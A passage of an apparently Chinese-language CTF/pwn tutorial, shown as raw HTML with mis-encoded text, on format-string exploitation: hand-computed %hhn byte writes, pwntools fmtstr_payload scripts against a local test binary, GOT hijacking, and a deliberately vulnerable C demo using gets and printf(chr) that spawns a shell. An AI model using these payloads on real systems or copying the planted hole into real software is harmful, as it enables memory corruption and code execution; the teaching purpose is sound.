<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a_address</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="si">%223c</span><span class="s2">%7$hhn&#34;</span>   <span class="c1"># å†™å…¥a_address â†’ 0xef</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="si">%207c</span><span class="s2">%8$hhn&#34;</span>   <span class="c1"># å†™å…¥a_address+1 â†’ 0xbe</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="si">%239c</span><span class="s2">%9$hhn&#34;</span>   <span class="c1"># å†™å…¥a_address+2 â†’ 0xad</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="si">%49c</span><span class="s2">%10$hhn&#34;</span>   <span class="c1"># å†™å…¥a_address+3 â†’ 0xde</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼ˆa_addressï¼‰ï¼šéœ€è¦è¾“å‡º239å­—èŠ‚ï¼Œå‡å»å‰ç¼€16å­—èŠ‚ â†’ 239-16=223</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç¬¬äºŒä¸ªå­—èŠ‚ï¼ˆa_address+1ï¼‰ï¼šéœ€è¦è¾“å‡º190å­—èŠ‚ï¼Œå‡å»å‰é¢å·²è¾“å‡ºçš„239å­—èŠ‚ â†’ 190-239= -49 â†’ å› ä¸èƒ½ä¸ºè´Ÿï¼ŒåŠ 256ï¼ˆ1å­—èŠ‚èŒƒå›´ï¼‰â†’ 207</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç¬¬ä¸‰ä¸ªå­—èŠ‚ï¼ˆa_address+2ï¼‰ï¼šéœ€è¦è¾“å‡º173å­—èŠ‚ï¼Œå‡å»å‰é¢ç´¯è®¡çš„190å­—èŠ‚ â†’ 173-190= -17 â†’ åŠ 256 â†’ 239</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç¬¬å››ä¸ªå­—èŠ‚ï¼ˆa_address+3ï¼‰ï¼šéœ€è¦è¾“å‡º222å­—èŠ‚ï¼Œå‡å»å‰é¢ç´¯è®¡çš„173å­—èŠ‚ â†’ 222-173=49</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-tip">
    <blockquote>
<p>æ¯”è¾ƒæ¨èè¿™æ ·å†™ï¼ˆå¯è¯»æ€§å¼ºï¼‰ï¼Œè¿ç€å†™å¾ˆå®¹æ˜“å‡ºé”™çš„ã€‚</p>
<p><strong>å½“å‰æ­¥éª¤éœ€è¦è¾“å‡ºçš„å­—ç¬¦æ•° = æœ¬æ¬¡ç›®æ ‡å­—èŠ‚å€¼ - ä¸Šä¸€æ­¥ç´¯è®¡è¾“å‡ºæ•°</strong></p>
<p>ï¼ˆå¦‚æœç»“æœä¸ºè´Ÿæ•°ï¼Œéœ€è¦åŠ  256 è¡¥æ­£ï¼Œå› ä¸º<code>%hhn</code>åªå–å•å­—èŠ‚ï¼ŒèŒƒå›´ 0-255ï¼‰</p>
</blockquote></blockquote>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>%xc</code>ä¸­çš„<code>x</code>ï¼ˆå³<code>c</code>å‰é¢çš„æ•°å­—ï¼‰æ˜¯é€šè¿‡<strong>ç›®æ ‡å­—èŠ‚å€¼</strong>å’Œ<strong>å½“å‰ç´¯è®¡è¾“å‡ºæ•°</strong>åæ¨å‡ºæ¥çš„ï¼Œæ ¸å¿ƒæ˜¯è®©<code>%hhn</code>æ‰§è¡Œæ—¶çš„ â€œç´¯è®¡è¾“å‡ºæ€»æ•°â€ æ°å¥½ç­‰äºç›®æ ‡å­—èŠ‚å€¼ï¼ˆæˆ–å¯¹ 256 å–æ¨¡åç­‰äºç›®æ ‡å€¼ï¼‰ã€‚ä¸‹é¢ç”¨ â€œé€†å‘è®¡ç®—â€ çš„æ–¹å¼ï¼Œä¸€æ­¥æ­¥è®²æ¸…æ¥šæ¯ä¸ªæ•°å­—æ˜¯æ€ä¹ˆæ¥çš„ã€‚</p>
<p><strong>æ ¸å¿ƒå…¬å¼</strong></p>
<p><strong>å½“å‰æ­¥éª¤éœ€è¦è¾“å‡ºçš„å­—ç¬¦æ•° = æœ¬æ¬¡ç›®æ ‡å­—èŠ‚å€¼ - ä¸Šä¸€æ­¥ç´¯è®¡è¾“å‡ºæ•°</strong></p>
<p>ï¼ˆå¦‚æœç»“æœä¸ºè´Ÿæ•°ï¼Œéœ€è¦åŠ  256 è¡¥æ­£ï¼Œå› ä¸º<code>%hhn</code>åªå–å•å­—èŠ‚ï¼ŒèŒƒå›´ 0-255ï¼‰</p>
<p>å‰æï¼šåˆå§‹ç´¯è®¡è¾“å‡ºæ•°</p>
<p>payload çš„å‰åŠéƒ¨åˆ†æ˜¯ 4 ä¸ªç›®æ ‡åœ°å€ï¼ˆ<code>a_address</code>åˆ°<code>a_address+3</code>ï¼‰ï¼Œæ¯ä¸ªåœ°å€ç”¨<code>p32()</code>è½¬æ¢ä¸º 4 å­—èŠ‚ï¼Œå…±<code>4Ã—4=16å­—èŠ‚</code>ã€‚è¿™ 16 å­—èŠ‚ä¼šè¢«ç¨‹åºå½“ä½œè¾“å‡ºå†…å®¹ï¼Œå› æ­¤<strong>åˆå§‹ç´¯è®¡è¾“å‡ºæ•°ä¸º 16</strong>ï¼ˆåœ¨ç¬¬ä¸€ä¸ª<code>%hhn</code>æ‰§è¡Œå‰ï¼Œè¿™ 16 å­—èŠ‚å·²ç»è¢«è®¡ç®—åœ¨å†…ï¼‰ã€‚</p>
<p><strong>é€è¡Œè®¡ç®—<code>c</code>å‰é¢çš„æ•°å­—</strong></p>
<p>å‡è®¾æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å‘ 4 ä¸ªåœ°å€åˆ†åˆ«å†™å…¥ï¼š</p>
<p><code>a_address</code> â†’ <code>0xef</code>ï¼ˆ239ï¼‰ã€<code>a_address+1</code> â†’ <code>0xbe</code>ï¼ˆ190ï¼‰ã€<code>a_address+2</code> â†’ <code>0xad</code>ï¼ˆ173ï¼‰ã€<code>a_address+3</code> â†’ <code>0xde</code>ï¼ˆ222ï¼‰ã€‚</p>
<ol>
<li><strong>ç¬¬ä¸€è¡Œï¼š<code>%223c%7$hhn</code>ï¼ˆç›®æ ‡ï¼š239ï¼‰</strong></li>
</ol>
<ul>
<li>ç›®æ ‡å­—èŠ‚å€¼ï¼š239ï¼ˆ<code>0xef</code>ï¼‰</li>
<li>åˆå§‹ç´¯è®¡è¾“å‡ºæ•°ï¼š16ï¼ˆæ¥è‡ª 4 ä¸ªåœ°å€çš„ 16 å­—èŠ‚ï¼‰</li>
<li>éœ€è¦è¾“å‡ºçš„å­—ç¬¦æ•° = ç›®æ ‡å€¼ - åˆå§‹ç´¯è®¡æ•° = 239 - 16 = 223</li>
<li>å› æ­¤ç”¨<code>%223c</code>ï¼Œè¾“å‡º 223 ä¸ªå­—ç¬¦åï¼Œç´¯è®¡è¾“å‡ºæ•° = 16 + 223 = 239ï¼Œæ­£å¥½ç­‰äºç›®æ ‡å€¼ï¼Œ<code>%7$hhn</code>å†™å…¥<code>0xef</code>ã€‚</li>
</ul>
<ol start="2">
<li><strong>ç¬¬äºŒè¡Œï¼š<code>%207c%8$hhn</code>ï¼ˆç›®æ ‡ï¼š190ï¼‰</strong></li>
</ol>
<ul>
<li>ç›®æ ‡å­—èŠ‚å€¼ï¼š190ï¼ˆ<code>0xbe</code>ï¼‰</li>
<li>ä¸Šä¸€æ­¥ç´¯è®¡è¾“å‡ºæ•°ï¼š239ï¼ˆç¬¬ä¸€è¡Œç»“æŸåçš„æ€»æ•°ï¼‰</li>
<li>ç›´æ¥è®¡ç®—ï¼š190 - 239 = -49ï¼ˆç»“æœä¸ºè´Ÿæ•°ï¼Œè¯´æ˜éœ€è¦ â€œç»•ä¸€åœˆâ€ï¼ŒåŠ  256 è¡¥æ­£ï¼‰</li>
<li>å®é™…éœ€è¦è¾“å‡ºçš„å­—ç¬¦æ•° = -49 + 256 = 207</li>
<li>è¾“å‡º 207 ä¸ªå­—ç¬¦åï¼Œç´¯è®¡è¾“å‡ºæ•° = 239 + 207 = 446ï¼Œ446 å¯¹ 256 å–æ¨¡ = 446-256=190ï¼Œæ­£å¥½ç­‰äºç›®æ ‡å€¼ï¼Œ<code>%8$hhn</code>å†™å…¥<code>0xbe</code>ã€‚</li>
</ul>
<ol start="3">
<li><strong>ç¬¬ä¸‰è¡Œï¼š<code>%239c%9$hhn</code>ï¼ˆç›®æ ‡ï¼š173ï¼‰</strong></li>
</ol>
<ul>
<li>ç›®æ ‡å­—èŠ‚å€¼ï¼š173ï¼ˆ<code>0xad</code>ï¼‰</li>
<li>ä¸Šä¸€æ­¥ç´¯è®¡è¾“å‡ºæ•°ï¼š446ï¼ˆç¬¬äºŒè¡Œç»“æŸåçš„æ€»æ•°ï¼‰</li>
<li>è®¡ç®—ï¼š173 - 446 = -273ï¼ˆè´Ÿæ•°ï¼ŒåŠ  256Ã—2 è¡¥æ­£ï¼Œå› ä¸º 256Ã—1=256 ä»å°äº 273ï¼‰</li>
<li>å®é™…éœ€è¦è¾“å‡ºçš„å­—ç¬¦æ•° = -273 + 256Ã—2 = -273 + 512 = 239</li>
<li>è¾“å‡º 239 ä¸ªå­—ç¬¦åï¼Œç´¯è®¡è¾“å‡ºæ•° = 446 + 239 = 685ï¼Œ685 å¯¹ 256 å–æ¨¡ = 685-256Ã—2=173ï¼Œç­‰äºç›®æ ‡å€¼ï¼Œ<code>%9$hhn</code>å†™å…¥<code>0xad</code>ã€‚</li>
</ul>
<ol start="4">
<li><strong>ç¬¬å››è¡Œï¼š<code>%49c%10$hhn</code>ï¼ˆç›®æ ‡ï¼š222ï¼‰</strong></li>
</ol>
<ul>
<li>ç›®æ ‡å­—èŠ‚å€¼ï¼š222ï¼ˆ<code>0xde</code>ï¼‰</li>
<li>ä¸Šä¸€æ­¥ç´¯è®¡è¾“å‡ºæ•°ï¼š685ï¼ˆç¬¬ä¸‰è¡Œç»“æŸåçš„æ€»æ•°ï¼‰</li>
<li>è®¡ç®—ï¼š222 - 685 = -463ï¼ˆè´Ÿæ•°ï¼ŒåŠ  256Ã—2 è¡¥æ­£ï¼Œ256Ã—2=512ï¼463ï¼‰</li>
<li>å®é™…éœ€è¦è¾“å‡ºçš„å­—ç¬¦æ•° = -463 + 256Ã—2 = -463 + 512 = 49</li>
<li>è¾“å‡º 49 ä¸ªå­—ç¬¦åï¼Œç´¯è®¡è¾“å‡ºæ•° = 685 + 49 = 734ï¼Œ734 å¯¹ 256 å–æ¨¡ = 734-256Ã—2=222ï¼Œç­‰äºç›®æ ‡å€¼ï¼Œ<code>%10$hhn</code>å†™å…¥<code>0xde</code>ã€‚</li>
</ul>
<p><strong>æ€»ç»“ï¼šè®¡ç®—æ­¥éª¤</strong></p>
<ol>
<li>ç¡®å®šæ¯ä¸ªåœ°å€è¦å†™å…¥çš„ç›®æ ‡å­—èŠ‚å€¼ï¼ˆå¦‚<code>0xef=239</code>ï¼‰ã€‚</li>
<li>è®°å½•ä¸Šä¸€æ­¥ç»“æŸåçš„ â€œç´¯è®¡è¾“å‡ºæ€»æ•°â€ï¼ˆåˆå§‹ä¸º 16ï¼Œä¹‹åæ˜¯æ¯æ­¥ç»“æŸçš„æ€»å’Œï¼‰ã€‚</li>
<li>ç”¨ â€œç›®æ ‡å€¼ - ä¸Šä¸€æ­¥ç´¯è®¡æ•°â€ï¼Œå¦‚æœç»“æœä¸ºè´Ÿï¼Œå°±åŠ ä¸Š 256 çš„å€æ•°ï¼ˆç›´åˆ°ç»“æœä¸ºæ­£æ•°ï¼‰ï¼Œå¾—åˆ°çš„å°±æ˜¯<code>%xc</code>ä¸­çš„<code>x</code>ã€‚</li>
</ol>
<p>è¿™æ ·å°±èƒ½ç¡®ä¿<code>%hhn</code>æ‰§è¡Œæ—¶ï¼Œç´¯è®¡è¾“å‡ºæ•°æ°å¥½ç­‰äºç›®æ ‡å­—èŠ‚å€¼ï¼ˆæˆ–å–æ¨¡åç›¸ç­‰ï¼‰ï¼Œä»è€Œç²¾å‡†å†™å…¥æƒ³è¦çš„å­—èŠ‚ã€‚</p>
</blockquote></blockquote>
<h2 id="gotè¡¨åŠ«æŒ">.gotè¡¨åŠ«æŒ
</h2><p><img src="/p/pwn-3/25.png"
	width="1019"
	height="243"
	srcset="/p/pwn-3/25_hu_642db382f68afc76.png 480w, /p/pwn-3/25_hu_ea082e0be13c5c64.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="419"
		data-flex-basis="1006px"
	
></p>
<p>åœ¨ä¹‹å‰çš„è®²è§£ä¸­ï¼Œæˆ‘ä»¬æœ‰è®²è¿‡ELFæ–‡ä»¶ä¸­åŠ¨æ€é“¾æ¥çš„å‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹ï¼Œåœ¨è°ƒç”¨.pltçš„æ—¶å€™ï¼Œä¼šä»gotè¡¨ä¸­å–å€¼<code>jmp</code>ï¼Œå¦‚æœæˆ‘ä»¬è¦†ç›–äº†.gotè¡¨ï¼Œå°±ä¼šè·³è½¬åˆ°æˆ‘ä»¬æŒ‡å®šçš„åœ°å€ã€‚</p>
<h3 id="åŠ«æŒæ–¹æ³•">åŠ«æŒæ–¹æ³•
</h3><h4 id="fmtstr_payloadå‡½æ•°">fmtstr_payloadå‡½æ•°
</h4><p>åœ¨æ­¤å‰åšè¿‡é“ºå«ï¼šåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œä»»æ„åœ°å€å†…å­˜è¦†ç›–ã€‚</p>
<p>è¿™é‡Œä¼šé€šè¿‡è¦†ç›–å¤§æ•°å­—å°±å¯ä»¥å¯¹.gotè¡¨è¿›è¡Œè¦†å†™ã€‚å¯¹äº<code>pwntools</code>æä¾›äº†ä¸€ä¸ªå‡½æ•°<code>fmtstr_payload()</code>ç”¨äºç”Ÿæˆè¿›è¡Œä»»æ„åœ°å€è¦†ç›–çš„payloadã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="p">{</span><span class="n">target_addr</span><span class="p">:</span> <span class="n">data</span><span class="p">})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="o">|</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">writes</span><span class="p">,</span> <span class="n">numbwritten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span> <span class="o">=</span> <span class="s1">&#39;byte&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><strong>offset</strong>:æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€åœ¨çš„åç§»ã€‚</li>
<li><strong>writes</strong>:å­—å…¸å˜é‡{address:value}ä»£è¡¨å°†addressä½ç½®çš„å€¼æ”¹ä¸ºvalueã€‚</li>
<li><strong>numbwritten</strong>:åœ¨è¿›è¡Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹å‰å·²ç»è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°ã€‚</li>
<li><strong>write_size</strong>:åˆ†åˆ«æ˜¯byte short intå¯¹åº”çš„æ˜¯<code>hhn hnn</code>ã€‚</li>
</ul>
<p>é‚£å°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æŠŠexpä¼˜åŒ–ä¸€ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x080491D4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a_address</span> <span class="o">=</span> <span class="mh">0x0804C020</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">a_address</span><span class="p">:</span> <span class="mh">0xdeadbeef</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payloadæ˜¯ç­‰æ•ˆçš„ï¼Œæ‰€ä»¥å¾ˆæ–¹ä¾¿ï¼Œä¹‹å‰è®²ä¸€å¤§å †çš„<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨</strong>æ˜¯ä¸ºäº†è®©ä½ èƒ½æ˜ç™½å…¶ä¸­åŸç†ã€‚å½“ç„¶æ„Ÿå…´è¶£å¯ä»¥å»æ‹†è§£<strong>fmtstr_payload</strong>å‡½æ•°ï¼Œçœ‹çœ‹æºç ã€‚</p>
<h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šçš„åˆ©ç”¨æ–¹å¼">æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šçš„åˆ©ç”¨æ–¹å¼
</h2><p>printfå‡½æ•°çš„å‚æ•°æ˜¯formatï¼Œç±»å‹æ˜¯ä¸€ä¸ªchar*æŒ‡é’ˆã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸­ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æ ¼å¼åŒ–å­—ç¬¦éƒ½æ˜¯ä¿å­˜åœ¨æ ˆä¸Šçš„ï¼Œä½†æœ‰æ—¶ä¹Ÿä¼šå‡ºç°æ ¼å¼åŒ–å­—ç¬¦ä¸²å¹¶æœªä¿å­˜åœ¨æ ˆä¸Šçš„æƒ…å†µã€‚</p>
<p>è¿™æ—¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸€èˆ¬ä¿å­˜åœ¨.bssæ®µæˆ–è€…ä¿å­˜åœ¨å †ä¸Šã€‚è¿™äº›åœ°å€åœ¨æ ˆä¸Šé€šè¿‡å‚æ•°æ˜¯æ— æ³•è®¿é—®åˆ°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å‰é¢æ‰€è®²çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨æ–¹æ³•å¾ˆï¼Œå¤šå°±æ— æ³•ä½¿ç”¨äº†ã€‚</p>
<p>æ¥çœ‹ä¸‹å…·ä½“åŒºåˆ«ï¼š</p>
<p>åœ¨æ ˆä¸Šï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>0x0</th>
          <th>0x1C</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0x4</td>
          <td>0x1234</td>
      </tr>
      <tr>
          <td>0x8</td>
          <td>0x2121</td>
      </tr>
      <tr>
          <td>0xC</td>
          <td>0x3332</td>
      </tr>
      <tr>
          <td>0x10</td>
          <td>0x4441</td>
      </tr>
      <tr>
          <td>0x14</td>
          <td>0x1235</td>
      </tr>
      <tr>
          <td>0x18</td>
          <td>0x3131</td>
      </tr>
      <tr>
          <td>0x1C</td>
          <td>%3$p</td>
      </tr>
  </tbody>
</table></div>
<p>ä¸åœ¨æ ˆä¸Šï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>0x0</th>
          <th>0x801020A0</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0x4</td>
          <td>0x1234</td>
      </tr>
      <tr>
          <td>0x8</td>
          <td>0x2121</td>
      </tr>
      <tr>
          <td>0xC</td>
          <td>0x3332</td>
      </tr>
      <tr>
          <td>0x10</td>
          <td>0x4441</td>
      </tr>
      <tr>
          <td>0x14</td>
          <td>0x1235</td>
      </tr>
      <tr>
          <td>0x18</td>
          <td>0x3131</td>
      </tr>
      <tr>
          <td>0x1C</td>
          <td>0x4141</td>
      </tr>
  </tbody>
</table></div>
<p>æ­¤æ—¶åœ¨æ ˆä¸Šåªæœ‰æŒ‡å‘è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ã€æŒ‡é’ˆä¹‹ç±»çš„ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>0x801020A0</th>
          <th>%3$p</th>
      </tr>
  </thead>
  <tbody>
  </tbody>
</table></div>
<p>å¯¹äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡è‡ªå·±åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­å†™å…¥ä¸€ä¸ªåœ°å€æ¥è¾¾åˆ°ä»»æ„åœ°å€è¦†ç›–ã€‚</p>
<p>è¿™æ—¶å€™æˆ‘ä»¬ä¸€èˆ¬é€‰æ‹©ä½¿ç”¨æ®‹ç•™åœ¨æ ˆä¸Šçš„åœ°å€æ¥å†™å…¥ä¸€ä¸ªåœ°å€ï¼Œä»è€Œè¾¾åˆ°ä»»æ„åœ°å€å†…å­˜è¦†ç›–çš„ç›®çš„ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>å¦‚æœæœ‰åµŒå¥—çš„å‡½æ•°è°ƒç”¨ï¼Œæ ˆä¸Šå°±ä¼šç•™å­˜ä¸€ä¸ªebp/rbpé“¾ï¼Œä»–ä»¬éƒ½æ˜¯æ ˆåœ°å€ï¼Œé€šè¿‡å¤šæ¬¡åˆ©ç”¨è¿™é‡Œæ®‹ç•™çš„æ ˆåœ°å€ï¼Œå°±å¯ä»¥åšåˆ°ä»»æ„åœ°å€å†™ï¼Œè¿‡ç¨‹ç®€å•æ¥è¯´å°±æ˜¯ä¸‹é¢è¿™æ ·ï¼Œå…¶ä¸­p2ï¼Œp3éƒ½æ˜¯æ ˆä¸Šçš„åœ°å€ã€‚</p>
<p>p4æ˜¯ç›®æ ‡åœ°å€</p>
<p>p1ä¸­å­˜æ”¾p2</p>
<p>p2ä¸­å­˜æ”¾p3</p>
<p>é€šè¿‡p1æ›´æ”¹p2çš„ä½åœ°å€ä½¿å…¶æŒ‡å‘p3ï¼Œé€šè¿‡p2æ›´æ”¹p3çš„å€¼ï¼Œä½¿å…¶æŒ‡å‘p4ï¼Œé€šè¿‡p3ä¿®æ”¹p4çš„å€¼ï¼Œå³æ„é€ ä»¥ä¸‹ä¸€ä¸ªåœ°å€é“¾ï¼š<code>p1-&gt;p2-&gt;p3-&gt;p4</code></p>
</blockquote></blockquote>
<p>è¦æ±‚ï¼š</p>
<p>è¿™ç§å¤šæ¬¡åˆ©ç”¨çš„æ‰‹æ³•éœ€è¦å­˜åœ¨å¤šæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå› ä¸ºprintfåœ¨è§£ææ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå¯¹äº%nã€%hnnã€%hnä¹‹ç±»çš„åœ°å€è¦†å†™ï¼Œæ˜¯åŒæ—¶è¿›è¡Œçš„è€Œä¸æ˜¯æŒ‰ä»å‰å‘åè§£æã€‚</p>
<p>ç¨‹åºæºä»£ç demox.c:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">chr</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>      
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="kt">long</span> <span class="n">secret</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">vuln</span><span class="p">();</span>  
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0xdeadbeef12345678LL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">chr</span><span class="p">,</span> <span class="s">&#34;bye&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">        <span class="nf">gets</span><span class="p">(</span><span class="n">chr</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="n">chr</span><span class="p">);</span>     
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¼–è¯‘ï¼š<a class="link" href="test_plus" >test_plus</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
